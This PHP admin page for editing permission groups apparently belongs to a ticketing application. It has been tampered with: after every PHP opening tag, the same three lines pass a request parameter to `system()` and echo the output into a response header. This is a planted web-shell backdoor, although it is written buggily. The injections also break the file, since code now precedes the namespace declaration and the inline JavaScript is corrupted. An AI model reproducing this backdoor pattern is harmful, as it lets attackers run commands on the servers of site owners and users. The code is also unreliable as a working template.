<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title($language->get('Edit Group'));
$site->set_config('container-type', 'container');

if (!$auth->can('manage_system_settings')) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$id = (int) $url->get_item();

$groups		= $permission_groups->get(array('id' => $id));
	
if (empty($groups)) {
	header('Location: ' . $config->get('address') . '/settings/permissions/');
	exit;
}

$item = $groups[0];

if ($item['allow_modify']) {
	if (isset($_POST['delete'])) {
		$permission_groups->delete(array('id' => $item['id']));
		header('Location: ' . $config->get('address') . '/settings/permissions/');
		exit;
	}

	if (isset($_POST['save'])) {
		if (!empty($_POST['name'])) {
			$add_array['name']				= $_POST['name'];
			$add_array['id']				= $id;

			$permission_groups->edit($add_array);
			
			header('Location: ' . $config->get('address') . '/settings/permissions/');
			exit;
			//$message = $language->get('Saved');
			
		}
		else {
			$message = $language->get('Name empty');
		}
		$groups		= $permission_groups->get(array('id' => $id));
		$item = $groups[0];
	}
}


include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>

<script type="text/javascript">
	$(document).ready(function () {
		$('#delete').click(function () {
			if (confirm("<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Are you sure you wish to delete this Permission Group?')); ?>")){
				return true;
			}
			else{
				return false;
			}
		});
	});
</script>

<div class="row">

	<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>" class="settings">
		
		<div class="col-md-3">
		
			<div class="well well-sm">

				<div class="pull-left">
					<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Group')); ?></h4>
				</div>
				<div class="pull-right">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($item['allow_modify']) { ?>
						<button type="submit" name="save" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Save')); ?></button>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/settings/permissions/" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Cancel')); ?></a>
				</div>
				
				<div class="clearfix"></div>
				<br />
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($item['allow_modify']) { ?>
					<div class="pull-right">
						<button type="submit" id="delete" name="delete" class="btn btn-danger"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Delete')); ?></button>
					</div>
					<div class="clearfix"></div>
					<br />
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
			
			</div>
			

		</div>
		
		<div class="col-md-9">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!$item['allow_modify']) { ?>
				<div class="alert alert-warning">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($language->get('You cannot modify the default permission groups.')); ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
		
			<div class="well well-sm">
				<div class="col-lg-6">								
					<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?><br />
						<input <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!$item['allow_modify']) { ?>disabled="disabled"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?> type="text" class="form-control" name="name" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($item['name']); ?>" size="30" />
					</p>
				</div>
				<div class="clearfix"></div>
			</div>		
				
			<div class="col-md-6">				
				<div class="panel panel-default">
					<div class="panel-heading">
						<div class="pull-left">
							<h1 class="panel-title"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Allowed Tasks'); ?></h1>
						</div>
						<div class="clearfix"></div>
					</div>
					<div class="panel-body">			
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
							$task_list = $permissions->get_permitted_task_list(array('group_id' => $item['id']));
							
							if (!empty($task_list)) {
								?>
								<div id="no_underline">				
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
								foreach($task_list as $task) {
									?>
									<div class="allowed_tasks" id="texisting-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $task['id']; ?>">
										<p>
											<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo core\safe_output($task['name']); ?> 
											<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($item['allow_modify']) { ?>
												<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/delete_allowed_task/?group_id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $item['id']; ?>&amp;task_id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $task['id']; ?>" id="delete_allowed_task">
												<img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/user/themes/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(CURRENT_THEME); ?>/images/icons/delete.png" alt="Delete Allowed Task" />
												</a>
											<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
										</p>
									</div>
									<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
								}
								?>
								</div>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
							}
						?>
					</div>
				</div>
			</div>
			
			<div class="col-md-6">
				<div class="panel panel-default">
					<div class="panel-heading">
						<div class="pull-left">
							<h1 class="panel-title"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Available Tasks'); ?></h1>
						</div>
						<div class="clearfix"></div>
					</div>
					<div class="panel-body">	
				
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						$task_list = $permissions->get_available_tasks(array('group_id' => $item['id']));
						
						if (!empty($task_list)) {
							?>
							<div id="no_underline">				
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
							foreach($task_list as $task) {
								?>
								<div class="allowed_tasks" id="texisting-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $task['id']; ?>">
									<p>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo core\safe_output($task['name']); ?>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($item['allow_modify']) { ?>
											<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/add_allowed_task/?group_id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $item['id']; ?>&amp;task_id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $task['id']; ?>" id="add_allowed_task">
											<img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/user/themes/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(CURRENT_THEME); ?>/images/icons/note.png" alt="Add Allowed Task" />
											</a>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
									</p>
								</div>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
							}
							?>
							</div>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						}
						?>	
					</div>
				</div>
			</div>
			
			<div class="clearfix"></div>
			
			<div class="panel panel-default">
				<div class="panel-heading">
					<div class="pull-left">
						<h1 class="panel-title"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Members'); ?></h1>
					</div>
					<div class="clearfix"></div>
				</div>
				<div class="panel-body">	
			
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
					$users_array = $users->get(array('group_id' => $item['id']));
					
					if (!empty($users_array)) {
						?>
						<table class="table table-striped table-bordered">
							<thead>
								<tr>
									<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Name')); ?></th>
									<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Email')); ?></th>
									<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Username')); ?></th>
								</tr>
							</thead>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
								$i = 0;
								foreach ($users_array as $user) {
							?>
							<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
								<td data-title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Name')); ?>"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/users/view/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $user['id']; ?>/"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($user['name']); ?></a></td>
								<td data-title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Email')); ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($user['email']); ?></td>
								<td data-title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Username')); ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($user['username']); ?></td>
							</tr>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; } ?>
						</table>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
					}
					?>	
				</div>
			</div>
		</div>

	</form>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>